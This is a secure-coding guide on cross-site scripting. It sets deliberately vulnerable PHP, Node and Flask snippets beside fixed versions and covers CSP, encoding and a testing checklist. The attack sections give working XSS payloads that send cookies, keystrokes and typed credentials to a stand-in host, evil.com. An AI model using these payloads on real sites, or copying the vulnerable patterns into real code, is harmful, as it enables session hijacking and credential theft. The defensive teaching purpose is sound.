# XSS (Cross-Site Scripting) Examples

## Overview

Cross-Site Scripting (XSS) attacks occur when attackers inject malicious scripts into web pages viewed by other users. This document provides concrete examples of XSS vulnerabilities and prevention strategies.

## Types of XSS Attacks

### Reflected XSS

**Bad Example (Vulnerable Code):**
```php
// VULNERABLE: Unsanitized user input in output
<?php
$searchTerm = $_GET['q'];
echo "<div>Search results for: " . $searchTerm . "</div>";
?>
```

**Attack:**
```
URL: https://example.com/search?q=<script>alert('XSS')</script>
Result: Script executes in victim's browser
```

**Why It's Bad:**
- User input directly rendered without encoding
- Attacker can craft malicious URLs
- Session hijacking, credential theft possible

**Secure Approach:**
```php
// SECURE: Proper output encoding
<?php
$searchTerm = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
echo "<div>Search results for: " . $searchTerm . "</div>";
?>
```

### Stored XSS

**Bad Example (Vulnerable Code):**
```javascript
// Node.js vulnerable - storing unsanitized comment
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    db.saveComment(comment); // Saved as-is
    res.redirect('/post/' + req.body.postId);
});

// Later rendered without encoding
app.get('/post/:id', (req, res) => {
    const comments = db.getComments(req.params.id);
    res.send(`<div class="comments">${comments}</div>`);
});
```

**Attack:**
```
Attacker submits comment: 
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

Every user viewing the post has their cookies stolen
```

**Why It's Bad:**
- Malicious script permanently stored
- Affects all users viewing the content
- No user interaction required beyond viewing page

**Secure Approach:**
```javascript
// SECURE: Sanitize on input AND encode on output
const DOMPurify = require('dompurify')(window);

// On input
app.post('/comment', (req, res) => {
    const comment = DOMPurify.sanitize(req.body.comment);
    db.saveComment(comment);
    res.redirect('/post/' + req.body.postId);
});

// On output (template engine auto-escapes)
res.render('post', { comments: comments }); // Using EJS, Pug, etc.
```

### DOM-Based XSS

**Bad Example (Vulnerable Code):**
```javascript
// VULNERABLE: Writing user input directly to DOM
function displayGreeting() {
    const name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('greeting').innerHTML = 'Hello, ' + name;
}

// Or using document.write
function showSearch() {
    const query = new URLSearchParams(window.location.search).get('q');
    document.write('<div>Results for: ' + query + '</div>');
}
```

**Attack:**
```
URL: https://example.com/greet?name=<img src=x onerror=alert('XSS')>
Result: Script executes when page loads
```

**Why It's Bad:**
- Happens entirely in client-side JavaScript
- Server-side protections may not help
- Uses dangerous DOM manipulation methods

**Secure Approach:**
```javascript
// SECURE: Use textContent or safe methods
function displayGreeting() {
    const name = new URLSearchParams(window.location.search).get('name');
    const greetingElement = document.getElementById('greeting');
    greetingElement.textContent = 'Hello, ' + name; // Automatically escaped
}

// Or use safe HTML sanitization
function showSearch() {
    const query = new URLSearchParams(window.location.search).get('q');
    const sanitizedQuery = DOMPurify.sanitize(query);
    document.getElementById('results').innerHTML = 'Results for: ' + sanitizedQuery;
}
```

## Real-World Attack Scenarios

### Scenario 1: Session Hijacking

**Vulnerable Code:**
```html
<!-- Forum displays username without encoding -->
<div class="post">
    <span class="author"><?php echo $username; ?></span>
    <div class="content"><?php echo $content; ?></div>
</div>
```

**Attack:**
```
Attacker registers username: <script>
    fetch('https://evil.com/steal?c=' + document.cookie);
</script>

When anyone views attacker's post, cookies sent to attacker
Attacker can now impersonate victims
```

**Secure Implementation:**
```php
<!-- SECURE: Encode all output -->
<div class="post">
    <span class="author"><?php echo htmlspecialchars($username, ENT_QUOTES); ?></span>
    <div class="content"><?php echo nl2br(htmlspecialchars($content, ENT_QUOTES)); ?></div>
</div>
```

### Scenario 2: Phishing via XSS

**Vulnerable Code:**
```javascript
// Error message displays unsanitized input
function showError(message) {
    document.getElementById('error').innerHTML = 
        '<div class="error">Error: ' + message + '</div>';
}

// Called from URL parameter
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('error')) {
    showError(urlParams.get('error'));
}
```

**Attack:**
```
URL: https://bank.com/login?error=<div style="background:red;padding:20px;">
<h2>Security Alert!</h2>
<p>Your session expired. Please re-enter credentials:</p>
<form action="https://evil.com/collect">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
</form>
</div>

Victim sees fake login form overlaid on real site
Credentials sent to attacker
```

**Secure Implementation:**
```javascript
// SECURE: Use textContent, never innerHTML with user data
function showError(message) {
    const errorDiv = document.getElementById('error');
    errorDiv.textContent = 'Error: ' + message;
    errorDiv.className = 'error';
}
```

### Scenario 3: Keylogging via XSS

**Vulnerable Code:**
```python
# Flask app - renders search term without escaping
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template_string(f'''
        <html>
        <body>
            <h1>Results for: {query}</h1>
            <!-- Rest of page -->
        </body>
        </html>
    ''')
```

**Attack:**
```
URL: https://site.com/search?q=<script>
document.addEventListener('keypress', function(e) {
    fetch('https://evil.com/log?key=' + encodeURIComponent(e.key));
});
</script>

All keystrokes on the page sent to attacker
Including passwords, messages, sensitive data
```

**Secure Implementation:**
```python
# SECURE: Template engines auto-escape by default
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)  # Auto-escaped

# In search.html:
# <h1>Results for: {{ query }}</h1>  # Auto-escaped by Jinja2
```

## Prevention Strategies

### Output Encoding (Context-Aware)

```python
# HTML Context
from markupsafe import escape
safe_output = escape(user_input)  # < becomes &lt;

# JavaScript Context
import json
safe_js = json.dumps(user_input)  # Properly escapes for JS

# URL Context
from urllib.parse import quote
safe_url = quote(user_input)

# CSS Context
import re
def sanitize_css(value):
    if re.match(r'^[a-zA-Z0-9\-_#\. ]+$', value):
        return value
    return ''
```

### Content Security Policy (CSP)

```html
<!-- HTTP Header -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">

<!-- Or HTTP header -->
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### Input Validation

```javascript
// Whitelist approach
function validateInput(input) {
    const allowedPatterns = {
        username: /^[a-zA-Z0-9_]{3,20}$/,
        email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        number: /^\d+$/
    };
    
    for (const [type, pattern] of Object.entries(allowedPatterns)) {
        if (!pattern.test(input)) {
            throw new Error(`Invalid ${type} format`);
        }
    }
    return true;
}
```

### Safe DOM Manipulation

```javascript
// DANGEROUS methods to avoid with user input:
element.innerHTML = userInput;     // ❌
element.outerHTML = userInput;     // ❌
document.write(userInput);         // ❌
element.insertAdjacentHTML(...);   // ❌

// SAFE alternatives:
element.textContent = userInput;   // ✅
element.innerText = userInput;     // ✅
element.setAttribute('title', userInput); // ✅ (mostly)
document.createTextNode(userInput); // ✅
```

### Framework-Specific Protections

```javascript
// React - automatically escapes
function Component({ userContent }) {
    return <div>{userContent}</div>; // Safe - auto-escaped
    
    // Dangerous if you must use dangerouslySetInnerHTML
    // return <div dangerouslySetInnerHTML={{__html: userContent}} />;
}

// Angular - automatically escapes
@Component({
    template: `<div>{{ userContent }}</div>`  // Safe - auto-escaped
})

// Vue - automatically escapes
<template>
    <div>{{ userContent }}</div>  <!-- Safe - auto-escaped -->
</template>
```

## Detection Patterns

### Code Review Red Flags

1. **Direct innerHTML Assignment:**
   ```javascript
   // BAD
   element.innerHTML = userInput;
   container.innerHTML = `<div>${data}</div>`;
   ```

2. **Server-Side String Interpolation:**
   ```python
   # BAD
   return f"<div>{user_input}</div>"
   template.render("Hello " + username)
   ```

3. **document.write Usage:**
   ```javascript
   // BAD
   document.write('<div>' + userData + '</div>');
   ```

4. **Eval with User Input:**
   ```javascript
   // EXTREMELY BAD
   eval(userInput);
   new Function(userInput)();
   ```

### Automated Testing

```javascript
// Test suite for XSS vulnerabilities
const xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
];

function testXSSProtection(endpoint, inputField) {
    for (const payload of xssPayloads) {
        const response = await submitForm(endpoint, {[inputField]: payload});
        if (response.contains(payload)) {
            console.log(`VULNERABLE: ${endpoint} with ${payload}`);
        }
    }
}
```

## Testing Checklist

- [ ] Test all input fields with script tags
- [ ] Test event handlers (onerror, onload, onclick)
- [ ] Test javascript: protocol in URLs
- [ ] Test SVG and other XML-based injections
- [ ] Verify output encoding in HTML context
- [ ] Verify output encoding in JavaScript context
- [ ] Verify output encoding in URL context
- [ ] Test stored XSS in comments, profiles, posts
- [ ] Test reflected XSS in search, errors, redirects
- [ ] Test DOM XSS in client-side routing
- [ ] Verify CSP headers are present and strict
- [ ] Test with encoded payloads (URL, HTML entity)
- [ ] Verify framework auto-escaping is enabled
- [ ] Check third-party libraries for XSS issues

## Related Documents

- [[security_mistakes]] - General security vulnerabilities
- [[sql_injection_examples]] - SQL injection attacks
- [[unsafe_code]] - Unsafe coding patterns
- [[prompt_injection_examples]] - AI-specific injection attacks
